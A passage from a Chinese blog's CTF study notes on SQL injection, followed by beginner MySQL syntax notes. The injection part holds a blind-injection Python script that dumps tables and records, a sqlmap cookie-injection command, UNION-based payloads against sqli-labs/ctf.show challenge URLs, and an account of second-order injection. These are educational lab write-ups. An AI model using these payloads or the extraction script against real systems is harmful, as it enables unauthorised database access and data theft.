punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> table_num<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取第"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"个数据表的名称的长度"</span><span class="token punctuation">)</span>        table_length <span class="token operator">=</span> get_table_length<span class="token punctuation">(</span>i<span class="token punctuation">,</span> database<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取第"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"个数据表的名称"</span><span class="token punctuation">)</span>        table <span class="token operator">=</span> get_table<span class="token punctuation">(</span>i<span class="token punctuation">,</span> table_length<span class="token punctuation">,</span> database<span class="token punctuation">)</span>        tables<span class="token punctuation">.</span>append<span class="token punctuation">(</span>table<span class="token punctuation">)</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#在这个循环中可以进入所有的数据表一探究竟</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"现在得到了以下数据表"</span><span class="token punctuation">,</span> tables<span class="token punctuation">)</span>        table <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请在这些数据表中选择一个目标: "</span><span class="token punctuation">)</span>        <span class="token keyword">while</span><span class="token punctuation">(</span> table <span class="token keyword">not</span> <span class="token keyword">in</span> tables <span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你输入有误"</span><span class="token punctuation">)</span>            table <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请重新选择一个目标"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"选择成功，开始获取数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"的字段数量"</span><span class="token punctuation">)</span>        column_num <span class="token operator">=</span> get_column_num<span class="token punctuation">(</span>table<span class="token punctuation">)</span>        columns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> column_num<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"第"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"个字段名称的长度"</span><span class="token punctuation">)</span>            column_length <span class="token operator">=</span> get_column_length<span class="token punctuation">(</span>i<span class="token punctuation">,</span> table<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"第"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"个字段的名称"</span><span class="token punctuation">)</span>            column <span class="token operator">=</span> get_column<span class="token punctuation">(</span>i<span class="token punctuation">,</span> column_length<span class="token punctuation">,</span> table<span class="token punctuation">)</span>            columns<span class="token punctuation">.</span>append<span class="token punctuation">(</span>column<span class="token punctuation">)</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#在这个循环中可以获取当前选择数据表的所有字段记录</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"现在得到了数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"中的以下字段"</span><span class="token punctuation">,</span> columns<span class="token punctuation">)</span>            column <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请在这些字段中选择一个目标: "</span><span class="token punctuation">)</span>            <span class="token keyword">while</span><span class="token punctuation">(</span> column <span class="token keyword">not</span> <span class="token keyword">in</span> columns <span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你输入有误"</span><span class="token punctuation">)</span>                column <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请重新选择一个目标"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"选择成功，开始获取数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"的记录数量"</span><span class="token punctuation">)</span>            flag_num <span class="token operator">=</span> get_flag_num<span class="token punctuation">(</span>column<span class="token punctuation">,</span> table<span class="token punctuation">)</span>            flags <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> flag_num<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"的"</span><span class="token punctuation">,</span> column<span class="token punctuation">,</span> <span class="token string">"字段的第"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"行记录的长度"</span><span class="token punctuation">)</span>                flag_length <span class="token operator">=</span> get_flag_length<span class="token punctuation">(</span>i<span class="token punctuation">,</span> column<span class="token punctuation">,</span> table<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"的"</span><span class="token punctuation">,</span> column<span class="token punctuation">,</span> <span class="token string">"字段的第"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"行记录的内容"</span><span class="token punctuation">)</span>                flag <span class="token operator">=</span> get_flag<span class="token punctuation">(</span>i<span class="token punctuation">,</span> flag_length<span class="token punctuation">,</span> column<span class="token punctuation">,</span> table<span class="token punctuation">)</span>                flags<span class="token punctuation">.</span>append<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"现在得到了数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"中"</span><span class="token punctuation">,</span> column<span class="token punctuation">,</span> <span class="token string">"字段中的以下记录"</span><span class="token punctuation">,</span> flags<span class="token punctuation">)</span>            quit <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"继续切换字段吗？(y/n)"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>quit <span class="token operator">==</span> <span class="token string">'n'</span> <span class="token keyword">or</span> quit <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>        quit <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"继续切换数据表名吗？(y/n)"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>quit <span class="token operator">==</span> <span class="token string">'n'</span> <span class="token keyword">or</span> quit <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bye~"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><ol><li><p>  Cookie值将作为where的查询条件</p></li><li><p>  其实就是<strong>前面的注入测试方法</strong>不再用get传参，而是在Cookie中传参</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240430202126.png"></p></li><li><p>此处介绍使用sqlmap进行Cookie注入的方法</p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://challenge-78e02a607cb3cd96.sandbox.ctfhub.com:10800/"</span> --cookie<span class="token operator">=</span><span class="token string">"id=1"</span> --level <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  使用sqlmap –cookie来检测cookie注入</p></li><li><p>  同时，可以将等级设置高一些，例如设置为3，不同的等级探测方法不同，3中包含Cookie UA等注入点的探测</p></li><li><p>  **do you want to try URI injections in the target URL itself? [Y/n/q]**，在url本身中尝试url注入，选了yes</p></li><li><p>  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n]，如果没有发现至少一种其他（潜在）技术，建议仅执行基本的 UNION 测试。你想减少请求的数量吗？yes</p></li><li><p>  **do you want to URL encode cookie values (implementation specific)? [Y/n]**，是否对cookie值进行url编码，yes</p></li></ol><p>Cookie: id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=’sqli’ limit 0,1–+</p><p>uqscbmbwfr        </p><p>sayplrawmj</p><h2 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a>堆叠注入：</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><h3 id="例题：sqli-labs38"><a href="#例题：sqli-labs38" class="headerlink" title="例题：sqli-labs38"></a>例题：sqli-labs38</h3><ol><li><a href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,database() –+<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712135428.png"></li><li><a href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1) –+      得到一共四个表<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712135922.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140048.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140103.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140115.png"></li><li><a href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,(select column_name from information_schema.columns where table_name =’users’ limit 0,1) –+<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140251.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140309.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140324.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140334.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140348.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140402.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140415.png"></li><li><a href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,(select group_concat(id) from security.users limit 0,1) –+<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140627.png"></li></ol><h4 id="注意是information-schema"><a href="#注意是information-schema" class="headerlink" title="注意是information_schema"></a>注意是information_schema</h4><ol><li>是下划线不是点，命名时数字字母下划线，没有点！！！</li><li>点表示选择，而information_schema是一个表</li></ol><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol><li>必须含有<strong>insert</strong>和<strong>update</strong>函数</li><li>变量可控<h3 id="原理：-绕过转义注入-魔术引号"><a href="#原理：-绕过转义注入-魔术引号" class="headerlink" title="原理： 绕过转义注入 魔术引号"></a>原理： <strong>绕过转义</strong>注入 魔术引号</h3></li><li>已经存储（数据库，文件）的用户输入被读取后再次进入到SQL查询语句中导致的注入</li><li>二次注入的原理，在第一次进行数据库插入数据的时候，使用了 addslashes 、get_magic_quotes_gpc、mysql_escape_string、mysql_real_escape_string等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是<strong>虽然参数在过滤后会添加 “\” 进行转义</strong>，但是<strong>“\”并不会插入到数据库中</strong>，在写入数据库的时候还是<strong>保留了原来的数据</strong>。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中<strong>取出了脏数据</strong>，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。<br>比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</li></ol><h4 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h4><ol><li>注册用户（插入数据）：    insert xiaodi union select’</li><li>过滤：        xiaodi union select&#39;</li><li>进入数据库：  xiaodi union select’</li><li>修改用户（修改数据库中的数据）：    update xiaodi union select’ 条件=用户名是谁  xiaodi’ union select update注入</li></ol><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li>插入恶意数据：进行数据库插入数据时，对其中的特殊字符进行了转义处理（<strong>转义只是为了校验</strong>），在写入数据库时又<strong>还原</strong>了原来的数据</li><li>应用恶意数据：开发者默认存入数据库中的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行下一步的校验处理</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712142916.png"></li></ol><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><ol><li>注册用户：insert xiaodi’</li><li>修改用户：update</li></ol><h3 id="二次注入功能点"><a href="#二次注入功能点" class="headerlink" title="二次注入功能点"></a>二次注入功能点</h3><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><h3 id="过滤函数addslashes"><a href="#过滤函数addslashes" class="headerlink" title="过滤函数addslashes"></a>过滤函数addslashes</h3><ol><li>addslashes()函数在指定的预定义字符前添加反斜杠，这些字符是：单引号（’）、双引号（”）、反斜线（\）与NUL（NULL字符）。</li><li>定义：string addslashes ( string $str )</li></ol><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="seay"><a href="#seay" class="headerlink" title="seay"></a>seay</h3><ol><li>关键字搜索，使用全局搜索,搜索可控变量或者执行函数</li><li>搜索例如select update insert 等sql语句函数，看看是否有可控变量，没有可控变量就是死sql语句，无法进行sql注入</li><li>函数查询</li><li>找到具体函数之后，右键定位函数使用的位置<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li></ol><h4 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h4><ol><li>搜索select</li><li>找到变量</li><li>找到变量调用函数</li><li>右键定位函数调用位置</li><li>看看页面和数据库的互动，根据回显判断注入点</li></ol><h4 id="判断过滤机制"><a href="#判断过滤机制" class="headerlink" title="判断过滤机制"></a>判断过滤机制</h4><ol><li>看配置文件，看配置文件的关键字，例如：fun、inc</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> sql注入 </category>
          
          <category> 手动注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 手动注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql操作</title>
      <link href="/mysql%E6%93%8D%E4%BD%9C/"/>
      <url>/mysql%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql操作"><a href="#mysql操作" class="headerlink" title="mysql操作"></a>mysql操作</h1><h2 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h2><h3 id="本质上是说这类数据库有多张表，通过关系彼此关联"><a href="#本质上是说这类数据库有多张表，通过关系彼此关联" class="headerlink" title="本质上是说这类数据库有多张表，通过关系彼此关联"></a>本质上是说这类数据库有多张表，通过关系彼此关联</h3><h2 id="sys是Mysql自己内部运行用的数据库"><a href="#sys是Mysql自己内部运行用的数据库" class="headerlink" title="sys是Mysql自己内部运行用的数据库"></a>sys是Mysql自己内部运行用的数据库</h2><h2 id="shemas"><a href="#shemas" class="headerlink" title="shemas"></a>shemas</h2><h1 id="着重号的使用："><a href="#着重号的使用：" class="headerlink" title="着重号的使用："></a>着重号的使用：</h1><ol><li>区分字段和关键字</li><li>例如：NAME本身是关键字，加``着重号后会变色，便于区分</li></ol><h3 id="tables"><a href="#tables" class="headerlink" title="tables"></a>tables</h3><ol><li>存储数据的地方<h4 id="点击最右侧的表格图标"><a href="#点击最右侧的表格图标" class="headerlink" title="点击最右侧的表格图标"></a>点击最右侧的表格图标</h4></li><li>显示出的数据每一行为一个数据，用id来唯一区分<h3 id="views"><a href="#views" class="headerlink" title="views"></a>views</h3></li><li>视图，将不同表的数据组合到一起<h3 id="stored-procedures"><a href="#stored-procedures" class="headerlink" title="stored procedures"></a>stored procedures</h3></li><li>存   储过程</li><li>用来查询数据<h3 id="functions"><a href="#functions" class="headerlink" title="functions"></a>functions</h3></li><li>函数</li><li>存储再数据库里的项目<h2 id="码风"><a href="#码风" class="headerlink" title="码风"></a>码风</h2></li><li>大写mysql关键字，小写其余内容</li></ol><h2 id="button"><a href="#button" class="headerlink" title="button"></a>button</h2><ol><li>Query中的execute是执行所有的sql</li></ol><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><h3 id="use"><a href="#use" class="headerlink" title="use"></a>use</h3><ol><li>调用数据库，类似与py中的import和c++中的include<h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3></li><li>指名想要明确获取的列</li><li>*代表所有列</li></ol><h2 id="查询常量值："><a href="#查询常量值：" class="headerlink" title="查询常量值："></a>查询常量值：</h2><ol><li>select 100;</li><li>select “name”;mysql中不区分字符和字符串的概念<h2 id="查询表达式："><a href="#查询表达式：" class="headerlink" title="查询表达式："></a>查询表达式：</h2></li><li>select 100*9;<h2 id="查询函数："><a href="#查询函数：" class="headerlink" title="查询函数："></a>查询函数：</h2></li><li>select VERSION()</li><li>调用该函数得到它的返回值</li></ol><h2 id="逻辑顺序："><a href="#逻辑顺序：" class="headerlink" title="逻辑顺序："></a>逻辑顺序：</h2><ol><li>先用from找到表</li><li>where走筛选</li><li>最后select走查询<h3 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h3></li><li>指名想要查询的表</li><li>select * from some_table：先库后id最后table</li><li>和py中的from random import choice 有异曲同工之处<h1 id="调用大小级关系"><a href="#调用大小级关系" class="headerlink" title="调用大小级关系"></a>调用大小级关系</h1></li><li>调用库用USE</li><li>调用列用select</li><li>调用table用FROM<h1 id="select语句"><a href="#select语句" class="headerlink" title="select语句"></a>select语句</h1></li><li>选择某一列</li><li>先后顺序根据参数的前后顺序决定</li><li>DISTINCT为消除重复项（列中参数的重复项）<h1 id="where语句"><a href="#where语句" class="headerlink" title="where语句"></a>where语句</h1></li><li>日期参数默认是year-month-date：四位year,两位month,两位date</li></ol><h2 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h2><ol><li>使用条件表达式筛选：条件运算符：&gt; &lt; = != &lt;&gt; &lt;= &gt;=</li><li>按照逻辑表达式筛选：逻辑运算符：&amp;&amp; || ! and or not </li><li>模糊查询：like; between and; in; is null;</li></ol><h2 id="参数：and-；not；-or；in-between-like-regexp"><a href="#参数：and-；not；-or；in-between-like-regexp" class="headerlink" title="参数：and ；not； or；in;between;like,regexp"></a>参数：and ；not； or；in;between;like,regexp</h2><h3 id="参数特点："><a href="#参数特点：" class="headerlink" title="参数特点："></a>参数特点：</h3><ol><li><h4 id="not"><a href="#not" class="headerlink" title="not"></a>not</h4></li><li> WHERE NOT(ID != 10 AND CountryCode = “AFG”)即可产生ID != 10 AND CountryCode = “AFG”的反面<h4 id="in"><a href="#in" class="headerlink" title="in"></a>in</h4></li><li>in:简化or的写法，即WHERE Name = a OR Name = b OR Name = c == WHERE Name IN (‘a’,’b’,’c’);字符型的值必须使用单引号引起来；当某一位为下划线的时候’_’</li><li>in列表的值类型必须统一</li><li>相当于=，不能用通配符’%’和’_’<h4 id="between-and"><a href="#between-and" class="headerlink" title="between and"></a>between and</h4></li><li>between:当要将一个属性同一个范围值相比较简化AND的写法：WHERE points &gt;= 1000 AND points &lt;= 3000 == WHERE points BETWEEN 1000 AND 3000(闭区间取值);两个临界值不能颠倒（先大于等于，后小于等于）<h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4></li><li>LIKE:%表示any number of characters;_表示single character<h4 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h4></li><li>REGEXP:regular expression(正则表达式)，用异或^来表示字符串开头，用美元$来表示字符串末尾，用|来表示多个寻找，用[‘]’来表示下一个字符从某个列表中寻找，在[]中用-来表示从哪到哪（a-h即为abcdefgh）<h4 id="null"><a href="#null" class="headerlink" title="null"></a>null</h4></li><li>null不能够使用=和&lt;&gt;</li><li>ifnull(exp1,exp2):当exp1为null时将返回exp2,否则将返回exp1</li></ol><h1 id="正则表达式："><a href="#正则表达式：" class="headerlink" title="正则表达式："></a>正则表达式：</h1><ol><li>^ beginning</li><li>$ end</li><li>| logical or</li><li>[abcd] any choice</li><li>[a-f] surrounding</li><li>&lt;=&gt; 安全等于，既可以用Null和数值等于</li></ol><h1 id="schemas中的每一个table的设置"><a href="#schemas中的每一个table的设置" class="headerlink" title="schemas中的每一个table的设置"></a>schemas中的每一个table的设置</h1><ol><li>第一行带黄色感叹号的是这张表的主键列，每一个table中都有一个</li></ol><h1 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h1><ol><li>排序，例：SELECT Name,CountryCode FROM city ORDER BY 1,2(即Name,CountryCode)</li><li>即将按照Name先排序，后按照CountryCode进行排序</li><li>asc是升序排序</li><li>desc是降序排序</li><li>SELECT * FROM employees ORDER BY salary DESC;</li><li>SELECT * FROM employees ORDER BY salary ASC;(asc可以省略)</li></ol><h1 id="limit-n"><a href="#limit-n" class="headerlink" title="limit n"></a>limit n</h1><ol><li>返回前n项<h2 id="offset-偏移量"><a href="#offset-偏移量" class="headerlink" title="offset(偏移量)"></a>offset(偏移量)</h2></li><li>limit m,n:跳过前m项数据后获取n条记录</li></ol><h1 id="内链接：同一个库中不同表格的链接"><a href="#内链接：同一个库中不同表格的链接" class="headerlink" title="内链接：同一个库中不同表格的链接"></a>内链接：同一个库中不同表格的链接</h1><ol><li>联合记录：on语句，例：JOIN customers ON orders.customer_id = customers.customer_id</li><li>加表格名前缀使列可以用，防止ambigous</li><li>使用别名避免重复，紧跟在每个表后使用别名<h1 id="跨数据库链接：不同数据库之间的链接"><a href="#跨数据库链接：不同数据库之间的链接" class="headerlink" title="跨数据库链接：不同数据库之间的链接"></a>跨数据库链接：不同数据库之间的链接</h1></li><li>未使用USE的数据库记得加上前缀</li></ol><h2 id="为字段起别名"><a href="#为字段起别名" class="headerlink" title="为字段起别名"></a>为字段起别名</h2><h3 id="便于理解，如果要查询的字段有重名的情况，使用别名可以区分开来"><a href="#便于理解，如果要查询的字段有重名的情况，使用别名可以区分开来" class="headerlink" title="便于理解，如果要查询的字段有重名的情况，使用别名可以区分开来"></a>便于理解，如果要查询的字段有重名的情况，使用别名可以区分开来</h3><h3 id="方式1：AS"><a href="#方式1：AS" class="headerlink" title="方式1：AS"></a>方式1：AS</h3><ol><li>select 100*98 AS 替换后的名字;</li><li>select last_name AS 姓,first_name AS 名 FROM table;<h3 id="方式2：空格"><a href="#方式2：空格" class="headerlink" title="方式2：空格"></a>方式2：空格</h3></li><li>select last_name 姓，first_name 名 FROM table;</li></ol><h3 id="案例："><a href="#案例：" class="headerlink" title="案例："></a>案例：</h3><ol><li>当有空格，井号等特殊符号时需要加单双引号</li><li>SELECT salary AS “out put” FROM employees;</li></ol><h2 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h2><h3 id="在字段前加上字段DISTINCT"><a href="#在字段前加上字段DISTINCT" class="headerlink" title="在字段前加上字段DISTINCT"></a>在字段前加上字段DISTINCT</h3><ol><li>SELECT DISTINCT department_id FROM employees;</li></ol><h2 id="的作用"><a href="#的作用" class="headerlink" title="+的作用"></a>+的作用</h2><h3 id="仅仅只有一个功能：运算符"><a href="#仅仅只有一个功能：运算符" class="headerlink" title="仅仅只有一个功能：运算符"></a>仅仅只有一个功能：运算符</h3><h3 id="只要有一个操作数为字符串，起连接符作用的java中-作用在mysql中不存在"><a href="#只要有一个操作数为字符串，起连接符作用的java中-作用在mysql中不存在" class="headerlink" title="只要有一个操作数为字符串，起连接符作用的java中+作用在mysql中不存在"></a>只要有一个操作数为字符串，起连接符作用的java中+作用在mysql中不存在</h3><ol><li>当其中一方为字符型，试图将字符型数据转换为数值型，成功则继续做加法运算，失败则将字符型数据转换为0</li><li>SELECT ‘123’ + 90得出213</li><li>SELECT ‘join’ + 90得出90</li><li>当一方为null则结果肯定为null（没有底数怎么加都没有结果）</li></ol><h1 id="函数："><a href="#函数：" class="headerlink" title="函数："></a>函数：</h1><ol><li>隐藏了实现细节</li><li>提高了代码的重用性<h2 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h2></li><li>select 函数名(实参列表) [from 表]<h2 id="特点"><a href="#特点" class="headerlink" 